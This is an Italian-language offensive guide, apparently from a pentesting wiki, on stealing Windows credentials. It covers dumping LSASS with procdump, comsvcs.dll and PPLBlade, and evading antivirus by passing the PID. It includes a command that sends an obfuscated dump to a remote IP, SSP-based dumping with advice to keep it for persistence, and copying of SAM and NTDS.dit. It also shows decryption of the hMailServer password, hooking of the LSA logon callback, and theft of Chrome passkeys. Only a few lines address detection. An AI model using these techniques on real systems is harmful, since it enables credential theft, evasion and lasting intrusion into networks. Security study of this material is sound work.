# Sottrazione delle credenziali Windows
...
**Nota**: alcuni **AV** potrebbero **rilevare** come **malevolo** l'uso di **procdump.exe per eseguire il dump di lsass.exe**, perché stanno **rilevando** le stringhe **"procdump.exe" e "lsass.exe"**. Pertanto, è più **stealthy** passare come **argomento** il **PID** di lsass.exe a procdump **invece del** **nome lsass.exe.**

### Dumping di lsass con **comsvcs.dll**

Una DLL denominata **comsvcs.dll**, presente in `C:\Windows\System32`, è responsabile del **dump della memoria del processo** in caso di crash. Questa DLL include una **funzione** denominata **`MiniDumpW`**, progettata per essere invocata utilizzando `rundll32.exe`.\
È irrilevante utilizzare i primi due argomenti, ma il terzo è suddiviso in tre componenti. Il primo componente è costituito dall'ID del processo di cui eseguire il dump, il secondo rappresenta il percorso del file di dump e il terzo componente deve essere necessariamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver analizzato questi tre componenti, la DLL viene utilizzata per creare il file di dump e trasferire la memoria del processo specificato in tale file.\
L'utilizzo di **comsvcs.dll** è possibile per eseguire il dump del processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio all'indirizzo [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il comando seguente viene utilizzato per l'esecuzione:
```bash
...
[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è un Protected Process Dumper Tool che supporta l'offuscamento del memory dump e il trasferimento su workstation remote senza scriverlo su disco.
...
3. Upload del memory dump con metodi di upload RAW e SMB senza scriverlo su disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dumping di LSASS basato su SSP senza MiniDumpWriteDump

Ink Dragon distribuisce un dumper in tre fasi denominato **LalsDumper** che non chiama mai `MiniDumpWriteDump`, quindi gli hook EDR su questa API non vengono mai attivati:<sup>[[3]](#references)</sup>
...
3. **Dumper della fase 3** – il payload mappato reimplementa la logica di MiniDump usando **syscall dirette** risolte a partire da nomi API sottoposti a hashing (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato denominato `Tom` apre `%TEMP%\<pid>.ddt`, trasferisce in streaming un dump compresso di LSASS nel file e chiude l'handle, permettendo l'exfiltration in un secondo momento.
...
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi inserire autonomamente quel valore per fare in modo che LSASS ricarichi l'SSP a ogni avvio.
...
* L'esecuzione di `lals.exe` richiede diritti di amministratore/SeTcb affinché `AddSecurityPackageA` abbia successo; una volta restituita la chiamata, LSASS carica in modo trasparente l'SSP rogue ed esegue la fase 2.
* La rimozione della DLL dal disco non la espelle da LSASS. Elimina la voce del registro e riavvia LSASS (riavvio del sistema), oppure lasciala per ottenere persistenza a lungo termine.
...
Il modo più semplice per rubare questi file è ottenere una copia dal registry:
```
...
Puoi copiare file protetti utilizzando questo servizio. Devi essere Administrator.
...
```
Ma puoi fare la stessa cosa da **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" e il file viene salvato in C:\users\Public), ma puoi usarlo per copiare qualsiasi file protetto:
```bash
...
```
Codice tratto dal libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>
...
Il file **NTDS.dit** è noto come il cuore di **Active Directory** e contiene dati fondamentali sugli oggetti utente, sui gruppi e sulle relative appartenenze. È il file in cui vengono archiviati gli **hash delle password** degli utenti del dominio. Questo file è un database **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.
...
Ulteriori informazioni: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows usa _Ntdsa.dll_ per interagire con quel file, e viene utilizzato da _lsass.exe_. Di conseguenza, una **parte** del file **NTDS.dit** potrebbe trovarsi nella memoria di **`lsass`** (è probabilmente possibile trovare i dati a cui si è avuto accesso più di recente grazie al miglioramento delle prestazioni ottenuto tramite una **cache**).

#### Decrittografia degli hash all'interno di NTDS.dit

L'hash viene cifrato 3 volte:

1. Decrittografare la Password Encryption Key (**PEK**) usando il **BOOTKEY** e **RC4**.
2. Decrittografare l'**hash** usando la **PEK** e **RC4**.
3. Decrittografare l'**hash** usando **DES**.

La **PEK** ha lo **stesso valore** in **ogni domain controller**, ma è **cifrata** all'interno del file **NTDS.dit** usando il **BOOTKEY** del **SYSTEM file del domain controller (è diverso tra i domain controller)**. Per questo motivo, per ottenere le credenziali dal file NTDS.dit **sono necessari i file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
...
```
Potresti anche usare il trucco della [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che ti servirà anche una copia del **SYSTEM file** (di nuovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).
...
Questo tool può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
...
* **Evidenze RDP in ingresso** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli Event ID **21** (accesso riuscito) e **25** (disconnessione), per mappare chi ha amministrato il sistema:
...
* `LocalAccountTokenFilterPolicy=1` disabilita il filtro dei token UAC, così gli amministratori locali ottengono token senza restrizioni tramite la rete.
...
## Credenziali del database hMailServer (post-compromise)

hMailServer memorizza la password del DB in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, nella sezione `[Database] Password=`. Il valore è crittografato con Blowfish usando la chiave statica `THIS_KEY_IS_NOT_SECRET` e scambi di endianness delle word di 4 byte. Usa la stringa esadecimale dall'INI con questo snippet Python:<sup>[[2]](#references)</sup>
```python
...
## Intercettazione del callback di accesso LSA (LsaApLogonUserEx2)

Alcuni tool catturano **password di accesso in chiaro** intercettando il callback di accesso LSA `LsaApLogonUserEx2`. L'idea consiste nell'applicare un hook o un wrapper al callback del pacchetto di autenticazione, in modo da catturare le credenziali **durante l'accesso** (prima dell'hashing), per poi scriverle su disco o restituirle all'operatore. Questa tecnica viene comunemente implementata come helper che esegue l'injection in LSA o si registra con LSA, quindi registra ogni evento di accesso interattivo/di rete riuscito con username, dominio e password.<sup>[[1]](#references)</sup>

Note operative:
- Richiede privilegi di amministratore locale/SYSTEM per caricare l'helper nel percorso di autenticazione.
- Le credenziali catturate compaiono solo quando avviene un accesso (interattivo, RDP, a un servizio o di rete, a seconda dell'hook).
...
type sqlstudio.b64
```
Sul lato dell'operatore, ricostruisci il file ed esegui localmente il dumper per recuperare le credenziali:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Furto di credenziali Passkeys / WebAuthn da Chrome su Windows

Se si ottiene l'**esecuzione di codice** come **utente vittima** su un host Windows che utilizza **Chrome + passkey sincronizzate con Google Password Manager**, le passkey diventano un interessante obiettivo di post-exploitation anche **senza privilegi di amministratore/SYSTEM**.<sup>[[4]](#references)</sup>
...
```
- **`Sync Data\LevelDB`** memorizza record **`WebauthnCredentialSpecifics`** codificati in protobuf. Un processo dello stesso utente può enumerare **RP ID**, **username**, **credential ID** e il materiale della chiave privata cifrata per le passkey sincronizzate.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** memorizza lo stato locale di registrazione del dispositivo, come **`wrapped_identity_private_key`** e il secret sottoposto a wrapping utilizzato per recuperare le credenziali sincronizzate.<sup>[[4]](#references)</sup>
...
```
### I blob di chiavi vincolati al TPM possono comunque essere abusati come oracoli locali di firma

Se il browser esporta una chiave di identità basata su TPM come **`NCRYPT_OPAQUE_KEY_BLOB`** e archivia quel blob in uno stato accessibile all'utente, il malware **non** deve estrarre la chiave privata grezza. Può semplicemente reimportare il blob sulla **stessa macchina** e chiedere al TPM locale di firmare dati controllati dall'attaccante:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Questo significa che il **hardware binding impedisce l'esportazione off-device, ma non l'utilizzo da parte dello stesso utente sull'endpoint compromesso**.
...
- Avviare un login passkey e ottenere una nuova challenge WebAuthn.
- Utilizzare il blob `wrapped_identity_private_key` rubato sul TPM della vittima per firmare il binding della richiesta del cloud-authenticator.
...
- Se il provider non verifica l'attestation / l'origine da secure hardware della nuova chiave UV, le firme successive della chiave dell'attaccante vengono trattate come **`UV=1`**.
...
- Monitorare la ricreazione/modifica di `passkey_enclave_state`, quindi eseguire il dump della memoria di Chrome mentre il plaintext **security domain secret (SDS)** è residente.
- Utilizzare l'SDS recuperato per decrittografare i campi cifrati in ogni record `WebauthnCredentialSpecifics` e recuperare le chiavi private WebAuthn portabili.
...
- Analizzare richieste ripetute del **Google Password Manager recovery PIN** o attività di re-onboarding inattese.
- Ricordare che **`signCount`** di WebAuthn spesso non è utile per le synced passkey, perché può rimanere costante; di conseguenza, il rilevamento classico dei cloni è debole.
